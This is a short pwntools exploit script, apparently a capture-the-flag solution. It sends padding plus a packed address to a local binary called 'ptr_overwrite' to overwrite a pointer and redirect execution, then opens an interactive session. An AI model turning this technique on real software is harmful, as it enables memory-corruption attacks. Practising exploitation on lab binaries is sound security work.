from pwn import *
context.log_level = "debug"
r = process('./ptr_overwrite')
vul_addr='a'*8+p64(0x4006c0)
r.recvuntil("plz input your name:\n")
r.sendline(vul_addr)
r.interactive()


